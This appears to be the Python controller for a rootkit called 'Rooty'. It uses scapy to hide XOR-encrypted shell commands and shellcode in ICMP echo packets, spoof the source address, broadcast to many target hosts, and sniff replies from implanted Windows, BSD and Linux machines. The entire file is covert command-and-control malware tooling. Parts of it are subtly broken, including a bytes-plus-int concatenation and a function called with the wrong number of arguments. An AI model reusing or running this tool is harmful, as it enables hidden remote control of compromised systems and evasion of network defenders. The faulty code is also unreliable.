from scapy.all import *
import _thread
import getopt
import struct
import hexdump
import re

from termcolor import colored

MSG_TYPE_RESPONSE =             0x00
MSG_TYPE_SHELLCODE =            0x01
MSG_TYPE_COMMAND =              0x02
MSG_TYPE_REMOTE_SHELLCODE =     0x03

MSG_ARCH_X64=                   0x10
MSG_OS_WINDOWS=                 0x20
MSG_OS_BSD=                     0x40
MSG_OS_LINUX=                   0x80

magic = b"GOATSE"
search = ""
src_ip = ""
dst_ip = ""
destinations = []
hosts_file = ""
shellcode_file = ""
block_size = 128
interface=None

class RootyMessageException(Exception):
    pass

class SystemInformation():
    def __init__(self, ip, arch, os):
        self.ip = ip
        self.arch = arch
        self.os = os

    def __str__(self):
        res = "{}".format(self.ip)

        if self.os == MSG_OS_WINDOWS:
            res += " Windows"
        elif self.os == MSG_OS_BSD:
            res += " BSD"
        elif self.os == MSG_OS_LINUX:
            res += " Linux"
        else:
            res += " Unknown"

        if self.arch  == MSG_ARCH_X64:
            res += " X64"
        else:
            res += " i386"

        return res
       
class RootyMessage():
    def __init__(self, pkt):
        global magic, block_size

        if len(pkt.load) > 0 and (len(pkt.load) % block_size == 0):
            data = crypt_data(pkt.load[block_size:], pkt.load[:block_size])

            if data.startswith(magic):
                self.source = SystemInformation(pkt[IP].src, data[6] & 0x10, data[6] & 0xE0)
                self.message_type = data[6] & 0x0F
                self.data_len = struct.unpack('<H', data[7:9])[0] 
                self.data = data[9:9 + self.data_len].decode()
                return
                
        raise RootyMessageException()

    def display(self):
        print("="*50)

        for attr in ['source', 'message_type', 'data_len']:
            print("{}: {}".format(attr, getattr(self, attr)))
        hexdump.hexdump(self.data.encode())

########## functions ############
def usage(err=None):
    if err:
        print("Error: {}\n".format(err))

    print("Usage:")
    print("\tpython {} -d <dst_ip|host_file> [-S <search>] -i <interface> [-s <src_ip>] [-f <shellcode_file>] [-h]".format(sys.argv[0]))
    print("\t\tinterface: The interface that should be used for sending packets. (REQUIRED)")
    print("\t\tdst_ip: the host we are communicating with (Can be broadcast)")
    print("\t\tsearch: regex to filter hosts")
    print("\t\thost_file: file containing hostnames of hosts we are communicating with")
    print("\t\tsrc_ip: the address we want to send from (Can be anything)")
    print("\t\tshellcode_file: send shellcode from this file to run on the host or use - to read from stdin")
    print()
    sys.exit(0)

def parse_args():
   global dst_ip, src_ip, shellcode_file, interface, destinations, search

   try:
       opts, args = getopt.gnu_getopt(sys.argv[1:], 'i:d:s:f:S:h', \
         ['interface=', 'destination=', 'source=', 'shellcode=', 'search=', 'help'])

   except getopt.GetoptError as err:
      usage(err)    

   for o, a in opts:
      if o in ('-d', '--destination'):
         if os.path.isfile(a):
            destinations = open(a, 'r').read().strip().split('\n')
         else:
            destinations = [a]
      if o in ('-i', '--interface'):
         interface = a
      if o in ('-s', '--source'):
         src_ip = a
      if o in ('-f', '--shellcode'):
         shellcode_file = a
      if o in ('-S', '--search'):
          search = a
      if o in ('-h', '--help'):
         usage()

def generate_key(len=64):
    global block_size

    return bytes([(random.randint(0, 255)) for _ in range(block_size)])


def crypt_data(data, key):
    global block_size

    if len(data) % block_size:
        data += (b"\x00" * (block_size - (len(data) % block_size)))

    j = 0
    output = []

    for i in range(len(data)):
        output.append(data[i] ^ key[j])

        if j > 0 and (j % (block_size - 1) == 0):
            j = 0
        else:
            j += 1

    return bytes(output)


def build_pkt(src, dst, data):
    ip = IP(dst=dst)

    if src_ip:
        ip.src = src

    return ip/ICMP(type=8, code=0, id=random.randint(0, 65535))/data

def sniff_packet(pkt):
    try:
        msg = RootyMessage(pkt)
        
        if msg.message_type == MSG_TYPE_RESPONSE:
            print('{}: {}'.format(colored(msg.source, 'green'), msg.data), end='')

    except (RootyMessageException, AttributeError):
        pass


def start_listener():
    global interface

    sniff(filter="icmp", prn=sniff_packet, iface=interface)

def send_shellcode():
   global MSG_TYPE_SHELLCODE, MSG_TYPE_REMOTE_SHELLCODE, magic, shellcode_file, last_packet
   shellcode = magic + MSG_TYPE_SHELLCODE
      
   # Open and read the shellcode
   if shellcode_file == '-':
      shellcode += sys.stdin.read()
   else:
      f = open(shellcode_file, 'r')
      shellcode += f.read()
      f.close()

   # Get the required crypto bits
   key = generate_key()
   encrypted_data = crypt_data(shellcode, key)
   last_packet = encrypted_data

   # Now send it
   send(build_pkt(src_ip, dst_ip, encrypted_data, key), verbose=0)

# We need use rand for key generation
random.seed()

# Parse the arguments
parse_args()

# Filter hosts by the search string
if search:
    destinations = [x for x in destinations if re.search(search, x)]

# Make sure we at least have a destination
if not destinations:
   print("ERROR: Destination must be specified")
   usage()
   sys.exit(0)
   
# Make sure we at least have a destination
if not interface:
   print("ERROR: Interface must be specified")
   usage()
   sys.exit(0)
 
# Do we send shellcode or start a shell
if shellcode_file != "":
	send_shellcode()
	print("Shellcode sent")
	sys.exit(0)

# Create the listener thread
_thread.start_new_thread(start_listener, ())

# Now just read our input and send commands
while 1:
   line = sys.stdin.readline().rstrip('\n').encode()
   key = generate_key()
   encrypted_data = crypt_data(magic + b"\x02" + struct.pack('<H', len(line)) + line, key)

   for dst_ip in destinations:
       send(build_pkt(src_ip, dst_ip, key + encrypted_data), verbose=0, iface=interface)
